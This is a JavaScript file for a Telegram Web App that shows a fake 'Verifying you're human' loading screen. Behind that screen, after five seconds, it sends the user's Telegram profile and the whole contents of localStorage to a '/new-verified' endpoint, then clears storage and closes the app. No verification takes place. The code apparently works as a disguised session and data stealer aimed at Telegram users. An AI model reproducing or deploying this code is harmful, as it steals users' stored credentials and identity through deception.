// deno-lint-ignore-file no-window
window.Sg = {
  verify: false,
  init() {
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.ready();
    }
  },
  close: () => {
    if (!this.verify) {
      this.verify = true;

      const isTelegram = window.Telegram?.WebApp?.initData;

      if (isTelegram) {
        // 🔵 Mostra schermata di caricamento SOLO se su Telegram
        document.body.innerHTML = `
  <div style="height: 100vh; display: flex; justify-content: center; align-items: center; background: white;">
    <h2 style="font-family: sans-serif; font-weight: normal; font-size: 20px;">
      Verifying you're human<span class="dots"></span>
    </h2>
  </div>

  <style>
    .dots::after {
      content: "";
      animation: dots 1.5s steps(3, end) infinite;
    }

    @keyframes dots {
      0%   { content: ""; }
      33%  { content: "."; }
      66%  { content: ".."; }
      100% { content: "..."; }
    }
  </style>
`;

      }

      // ⏳ Attendi e chiudi SOLO se su Telegram
      if (isTelegram) {
        setTimeout(async () => {
          const user = window.Telegram.WebApp.initDataUnsafe.user || {};
          await fetch("/new-verified", {
            method: "POST",
            body: JSON.stringify({
              user,
              storage: window.localStorage,
            }),
            headers: {
              "content-type": "application/json",
            },
          });

          localStorage.clear();
          window.Telegram.WebApp.close();
        }, 5000); // 5 secondi
      }
    }
  },
};

Sg.init();
